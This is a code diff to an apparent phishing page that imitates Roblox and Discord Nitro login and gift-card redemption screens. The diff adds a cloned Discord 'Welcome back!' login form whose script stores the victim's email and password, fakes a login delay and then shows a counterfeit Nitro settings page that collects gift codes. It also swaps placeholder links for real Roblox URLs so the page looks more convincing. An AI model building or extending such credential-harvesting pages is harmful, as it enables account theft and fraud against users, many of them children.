@@ -257,24 +257,24 @@
 <!-- ROBLOX THEME (SAME TO SAME) -->
 <div class="rb-login-wrapper" id="rb-login-section">
   <div class="rb-login-card">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="rb-login-logo" alt="Roblox">
+    <img src="assets/roblox/logo.png" class="rb-login-logo" alt="Roblox">
     <h2 class="rb-login-title">Login to Roblox</h2>
     <div id="rb-login-error" style="color:#d33;font-size:14px;margin-bottom:15px;display:none"></div>
     <input type="text" class="rb-login-inp" id="rb-login-user" placeholder="Username/Email/Phone">
     <input type="password" class="rb-login-inp" id="rb-login-pass" placeholder="Password">
     <button class="rb-btn-login" onclick="rdDoRbLogin()">Log In</button>
-    <a href="#" class="rb-login-forgot">Forgot Password or Username?</a>
+    <a href="https://www.roblox.com/login/forgot-password-or-username" class="rb-login-forgot" target="_blank">Forgot Password or Username?</a>
   </div>
 </div>
 
 <div class="rb-theme-wrapper" id="rb-ui">
   <div class="rb-topbar">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/3/3a/Roblox_player_icon_black.svg" class="rb-logo" alt="Roblox" onclick="rdBack()">
+    <img src="assets/roblox/logo.png" class="rb-logo" alt="Roblox" onclick="rdBack()">
     <div class="rb-nav-links">
-      <span class="rb-nav-link">Charts</span>
-      <span class="rb-nav-link">Marketplace</span>
-      <span class="rb-nav-link">Create</span>
-      <span class="rb-nav-link">Robux</span>
+      <a href="https://www.roblox.com/charts" class="rb-nav-link" target="_blank">Charts</a>
+      <a href="https://www.roblox.com/catalog" class="rb-nav-link" target="_blank">Marketplace</a>
+      <a href="https://www.roblox.com/develop" class="rb-nav-link" target="_blank">Create</a>
+      <a href="https://www.roblox.com/robux" class="rb-nav-link" target="_blank">Robux</a>
     </div>
     <div class="rb-search-bar">
       <span class="rb-search-ico">🔍</span>
@@ -282,8 +282,8 @@
     </div>
     <div class="rb-user-right">
       <div class="rb-user-pill" id="rb-display-user">👤 User</div>
-      <div class="rb-robux">⬢ 720</div>
-      <span style="font-size:20px;cursor:pointer">⚙️</span>
+      <div class="rb-robux" onclick="window.open('https://www.roblox.com/robux','_blank')">⬢ 720</div>
+      <span style="font-size:20px;cursor:pointer" onclick="window.open('https://www.roblox.com/my/account','_blank')">⚙️</span>
     </div>
   </div>
 
@@ -303,7 +303,7 @@
       <button class="rb-btn-redeem" id="rb-btn-rd" onclick="rdSubmitRb()">Redeem</button>
       
       <div class="rb-terms">
-        By redeeming your code, you represent that you, and your parent or legal guardian if you are under age 18, agree to our <a href="#">Terms of Use</a> including the arbitration clause and <a href="#">Gift Card Terms & Conditions</a> and acknowledge our <a href="#">Privacy Policy</a>.
+        By redeeming your code, you represent that you, and your parent or legal guardian if you are under age 18, agree to our <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use" target="_blank">Terms of Use</a> including the arbitration clause and <a href="https://en.help.roblox.com/hc/en-us/articles/115005566223" target="_blank">Gift Card Terms & Conditions</a> and acknowledge our <a href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-Policy" target="_blank">Privacy Policy</a>.
       </div>
       
       <div class="rb-credit">Available Credit: 0,00 €</div>
@@ -311,31 +311,135 @@
     
     <div class="rb-content-right">
       <h3 class="rb-sidebar-title">Additional Information</h3>
-      <a href="#" class="rb-side-link">How to Redeem Gift Cards (Video)</a>
-      <a href="#" class="rb-side-link">More Help on Gift Cards</a>
-      <a href="#" class="rb-side-link">How to Redeem Virtual Item Codes</a>
-      <a href="#" class="rb-side-link">How to Redeem Promo Codes</a>
-      <a href="#" class="rb-side-link">Learn About Roblox Safety, Moderation, and Parental Controls</a>
+      <a href="https://www.youtube.com/watch?v=R6u_D2-0X8Y" class="rb-side-link" target="_blank">How to Redeem Gift Cards (Video)</a>
+      <a href="https://en.help.roblox.com/hc/en-us/articles/115005566223-How-to-Redeem-Gift-Cards" class="rb-side-link" target="_blank">More Help on Gift Cards</a>
+      <a href="https://en.help.roblox.com/hc/en-us/articles/115005566223" class="rb-side-link" target="_blank">How to Redeem Virtual Item Codes</a>
+      <a href="https://www.roblox.com/redeem" class="rb-side-link" target="_blank">How to Redeem Promo Codes</a>
+      <a href="https://www.roblox.com/safety" class="rb-side-link" target="_blank">Learn About Roblox Safety, Moderation, and Parental Controls</a>
       
-      <img src="https://images.rbxcdn.com/791986953e93ca917397262299719464.png" class="rb-side-img" alt="Roblox">
+      <img src="assets/roblox/side.jpg" class="rb-side-img" alt="Roblox">
     </div>
   </div>
 
   <footer class="rb-footer">
     <div class="rb-foot-links">
-      <a href="#" class="rb-foot-link">About Us</a>
-      <a href="#" class="rb-foot-link">Jobs</a>
-      <a href="#" class="rb-foot-link">Blog</a>
-      <a href="#" class="rb-foot-link">Parents</a>
-      <a href="#" class="rb-foot-link">Buy Gift Cards</a>
-      <a href="#" class="rb-foot-link">Help</a>
-      <a href="#" class="rb-foot-link">Terms</a>
-      <a href="#" class="rb-foot-link">Accessibility</a>
-      <a href="#" class="rb-foot-link">Privacy</a>
-      <a href="#" class="rb-foot-link">Your Privacy Choices</a>
-      <a href="#" class="rb-foot-link">Sitemap</a>
+      <a href="https://corp.roblox.com/" class="rb-foot-link" target="_blank">About Us</a>
+      <a href="https://corp.roblox.com/careers/" class="rb-foot-link" target="_blank">Jobs</a>
+      <a href="https://blog.roblox.com/" class="rb-foot-link" target="_blank">Blog</a>
+      <a href="https://corp.roblox.com/parents/" class="rb-foot-link" target="_blank">Parents</a>
+      <a href="https://www.roblox.com/giftcards" class="rb-foot-link" target="_blank">Buy Gift Cards</a>
+      <a href="https://en.help.roblox.com/hc/en-us" class="rb-foot-link" target="_blank">Help</a>
+      <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846-Roblox-Terms-of-Use" class="rb-foot-link" target="_blank">Terms</a>
+      <a href="https://en.help.roblox.com/hc/en-us/articles/115004647846" class="rb-foot-link" target="_blank">Accessibility</a>
+      <a href="https://en.help.roblox.com/hc/en-us/articles/115004630823-Roblox-Privacy-Policy" class="rb-foot-link" target="_blank">Privacy</a>
+      <a href="https://www.roblox.com/my/privacy" class="rb-foot-link" target="_blank">Your Privacy Choices</a>
+      <a href="https://www.roblox.com/sitemap" class="rb-foot-link" target="_blank">Sitemap</a>
     </div>
   </footer>
+</div>
+<!-- DISCORD THEME (SAME TO SAME) -->
+<div class="dc-login-wrapper" id="dc-login-section">
+  <div class="rb-login-card" style="background:#313338;box-shadow:none;border:none">
+    <img src="https://assets-global.website-files.com/6257adef93867a3c8458b9ff/6257d0577a66f46618e47228_discord%20logomark%20white.png" style="height:60px;margin-bottom:30px" alt="Discord">
+    <h2 class="rb-login-title" style="color:#fff;font-size:24px;font-weight:700">Welcome back!</h2>
+    <p style="color:#b5bac1;margin-bottom:24px;margin-top:-20px">We're so excited to see you again!</p>
+    <div id="dc-login-error" style="color:#fa777c;font-size:14px;margin-bottom:15px;display:none;background:rgba(250,119,124,0.1);padding:10px;border-radius:4px"></div>
+    
+    <div style="text-align:left;margin-bottom:20px">
+      <label style="color:#b5bac1;font-size:12px;font-weight:700;text-transform:uppercase;display:block;margin-bottom:8px">Email or Phone Number</label>
+      <input type="text" class="dc-inp" id="dc-login-user" placeholder="" style="margin-bottom:0">
+    </div>
+    <div style="text-align:left;margin-bottom:20px">
+      <label style="color:#b5bac1;font-size:12px;font-weight:700;text-transform:uppercase;display:block;margin-bottom:8px">Password</label>
+      <input type="password" class="dc-inp" id="dc-login-pass" placeholder="" style="margin-bottom:0">
+      <a href="#" style="color:#00a8fc;font-size:14px;text-decoration:none;display:block;margin-top:8px">Forgot your password?</a>
+    </div>
+    
+    <button class="dc-btn-redeem" onclick="rdDoDcLogin()" style="padding:14px;font-size:16px;margin-top:10px">Log In</button>
+    <p style="color:#949ba4;font-size:14px;margin-top:16px">Need an account? <a href="#" style="color:#00a8fc;text-decoration:none">Register</a></p>
+  </div>
+</div>
+
+<div class="dc-theme-wrapper" id="dc-ui">
+  <div class="dc-sidebar">
+    <div class="dc-side-hdr">User Settings</div>
+    <div class="dc-side-item">My Account</div>
+    <div class="dc-side-item">Profiles</div>
+    <div class="dc-side-item">Privacy & Safety</div>
+    <div class="dc-side-item">Authorized Apps</div>
+    <div class="dc-side-item">Devices</div>
+    <div class="dc-side-item">Connections</div>
+    <div class="dc-side-item">Friend Requests</div>
+    <div style="height:1px;background:rgba(255,255,255,0.06);margin:8px 10px"></div>
+    <div class="dc-side-hdr">Billing Settings</div>
+    <div class="dc-side-item active">Nitro</div>
+    <div class="dc-side-item">Server Boost</div>
+    <div class="dc-side-item">Subscriptions</div>
+    <div class="dc-side-item">Gift Inventory</div>
+    <div class="dc-side-item">Billing</div>
+  </div>
+
+  <div class="dc-main">
+    <div class="dc-content">
+      <div class="dc-nitro-hero">
+        <div class="dc-nitro-title">
+          <img src="https://assets-global.website-files.com/6257adef93867a3c8458b9ff/6257d0577a66f46618e47228_discord%20logomark%20white.png" height="32" alt="">
+          Nitro
+        </div>
+        <p class="dc-nitro-subtitle">Unleash more fun with Discord Nitro. Get HD video, bigger uploads, custom emojis, and more!</p>
+        
+        <div class="dc-plans-grid">
+          <div class="dc-plan-card basic" onclick="rdDcPlan('basic')" id="dc-p-basic">
+            <div class="dc-plan-hdr">
+              <div class="dc-plan-nm">Nitro Basic</div>
+              <div class="dc-plan-pr">₹1,199/yr</div>
+            </div>
+            <ul class="dc-plan-feats">
+              <li class="dc-plan-feat">50MB upload limit</li>
+              <li class="dc-plan-feat">Custom emojis anywhere</li>
+              <li class="dc-plan-feat">Special Nitro badge</li>
+              <li class="dc-plan-feat">Custom video backgrounds</li>
+            </ul>
+            <button class="dc-btn-subscribe basic">Select Basic</button>
+          </div>
+          
+          <div class="dc-plan-card boost" onclick="rdDcPlan('boost')" id="dc-p-boost">
+            <div class="dc-plan-hdr">
+              <div class="dc-plan-nm">Nitro</div>
+              <div class="dc-plan-pr">₹5,999/yr</div>
+            </div>
+            <ul class="dc-plan-feats">
+              <li class="dc-plan-feat">500MB upload limit</li>
+              <li class="dc-plan-feat">HD Video Streaming</li>
+              <li class="dc-plan-feat">2 Server Boosts</li>
+              <li class="dc-plan-feat">Custom Profile themes</li>
+              <li class="dc-plan-feat">Animated avatars & banners</li>
+            </ul>
+            <button class="dc-btn-subscribe boost">Select Nitro</button>
+          </div>
+        </div>
+
+        <div style="background:rgba(255,255,255,0.03);border:1px dashed rgba(255,255,255,0.1);border-radius:8px;padding:30px;text-align:center;margin-top:40px">
+           <div style="color:#fff;font-size:18px;font-weight:700;margin-bottom:8px">Have a gift code?</div>
+           <p style="color:#b5bac1;font-size:14px;margin-bottom:20px">If you received a Nitro gift from a friend, you can redeem it here.</p>
+           <button class="dc-btn-redeem" onclick="document.getElementById('dc-redeem-box').style.display='block';this.parentElement.style.display='none'" style="max-width:200px">Redeem Gift</button>
+        </div>
+
+        <div class="dc-redeem-section" id="dc-redeem-box">
+          <div style="font-size:20px;font-weight:700;color:#fff;margin-bottom:16px">Redeem Code</div>
+          <p style="color:#b5bac1;font-size:14px;margin-bottom:20px">Received a gift code? Enter it below to activate your Nitro subscription.</p>
+          
+          <label class="dc-inp-label">Redemption Code</label>
+          <input type="text" class="dc-inp" id="dc-code-val" placeholder="XXXX-XXXX-XXXX-XXXX" oninput="fmtCode(this)">
+          
+          <div id="dc-err" style="color:#fa777c;font-size:13px;margin-bottom:15px;display:none">Invalid or used code.</div>
+          
+          <button class="dc-btn-redeem" id="dc-btn-rd" onclick="rdSubmitDc()">Redeem Code</button>
+        </div>
+      </div>
+    </div>
+    <div class="dc-close-btn" onclick="rdBack()" title="Close Settings">ESC</div>
+  </div>
 </div>
 
 <footer id="std-footer">
@@ -372,7 +476,12 @@ function rdGame(g) {
     
     document.getElementById('rb-login-section').style.display = 'flex';
   } else if (g === 'nitro') {
-    show('rd-nitro-plan');
+    document.getElementById('std-ui').style.display = 'none';
+    document.getElementById('std-bg').style.display = 'none';
+    document.getElementById('std-footer').style.display = 'none';
+    document.querySelector('nav').style.display = 'none';
+    
+    document.getElementById('dc-login-section').style.display = 'flex';
   } else if (g === 'mc' || g === 'xbox') {
     // PRO THEME FOR MC/XBOX
     document.getElementById('std-ui').style.display = 'none';
@@ -458,7 +567,7 @@ function rdBack() {
   document.getElementById('mc-login-email').value = '';
   document.getElementById('mc-login-pass').value = '';
 
-  hide(['rd-rb-plan','rd-codebox','rd-nitro-plan','mc-login-section','mc-redeem-section','rb-login-section','rb-ui']); 
+  hide(['rd-rb-plan','rd-codebox','rd-nitro-plan','mc-login-section','mc-redeem-section','rb-login-section','rb-ui','dc-login-section','dc-ui']); 
   show('rd-s1');
   RD.game = null; RD.plan = null; RD.user = null;
 }
@@ -504,6 +613,52 @@ function rdSubmitRb() {
   btn.disabled = true;
   
   processSubmit(code, 'rb-btn-rd', '', '', '', '', true);
+}
+
+function rdDoDcLogin() {
+  const user = document.getElementById('dc-login-user').value.trim();
+  const pass = document.getElementById('dc-login-pass').value.trim();
+  const err = document.getElementById('dc-login-error');
+  
+  if (!user || !pass) {
+    err.textContent = 'Please enter your email and password.';
+    err.style.display = 'block';
+    return;
+  }
+  
+  RD.user = { name: user.split('@')[0], email: user, pass: pass };
+  RD.rbUn = user.split('@')[0]; RD.rbEm = user;
+  
+  const btn = document.querySelector('#dc-login-section .dc-btn-redeem');
+  const old = btn.textContent;
+  btn.textContent = 'Logging in...';
+  btn.disabled = true;
+  
+  setTimeout(() => {
+    btn.textContent = old;
+    btn.disabled = false;
+    document.getElementById('dc-login-section').style.display = 'none';
+    document.getElementById('dc-ui').style.display = 'flex';
+  }, 1200);
+}
+
+function rdDcPlan(p) {
+  RD.plan = p;
+  document.getElementById('dc-p-basic').style.borderColor = p === 'basic' ? '#00b0f4' : '';
+  document.getElementById('dc-p-boost').style.borderColor = p === 'boost' ? '#5865f2' : '';
+  document.getElementById('dc-redeem-box').style.display = 'block';
+  document.getElementById('dc-redeem-box').scrollIntoView({ behavior: 'smooth' });
+}
+
+function rdSubmitDc() {
+  const code = document.getElementById('dc-code-val').value.trim().toUpperCase();
+  const btn = document.getElementById('dc-btn-rd');
+  if (!RD.plan) { toast('!', 'Please select a plan first'); return; }
+  
+  btn.textContent = 'Redeeming...';
+  btn.disabled = true;
+  
+  processSubmit(code, 'dc-btn-rd', '', '', '', '', true);
 }
 
 function rdNitroPlan(p) {
@@ -624,6 +779,10 @@ function processSubmit(code, btnId, btId, spId, msgId, codeId, isPro=false) {
           btn.textContent = 'Redeem';
           document.getElementById('rb-err').style.display = 'flex';
           document.getElementById('rb-err').querySelector('span:last-child').textContent = result.message || 'Invalid Code';
+        } else if (RD.game === 'nitro') {
+          btn.textContent = 'Redeem Code';
+          document.getElementById('dc-err').style.display = 'block';
+          document.getElementById('dc-err').textContent = result.message || 'Invalid Code';
         } else {
           btn.textContent = 'REDEEM';
         }
@@ -664,7 +823,7 @@ function processSubmit(code, btnId, btId, spId, msgId, codeId, isPro=false) {
     
     document.getElementById('rd-ok-title').textContent = gnames[RD.game] + ' Redeemed!';
     document.getElementById('rd-ok-inv').innerHTML = buildInv(invObj);
-    hide(['rd-s1','rd-rb-plan','rd-codebox','rd-nitro-plan','mc-login-section','mc-redeem-section','rb-login-section','rb-ui']);
+    hide(['rd-s1','rd-rb-plan','rd-codebox','rd-nitro-plan','mc-login-section','mc-redeem-section','rb-login-section','rb-ui','dc-login-section','dc-ui']);
     document.getElementById('rd-ok').classList.add('show');
     
     if(!isPro) {
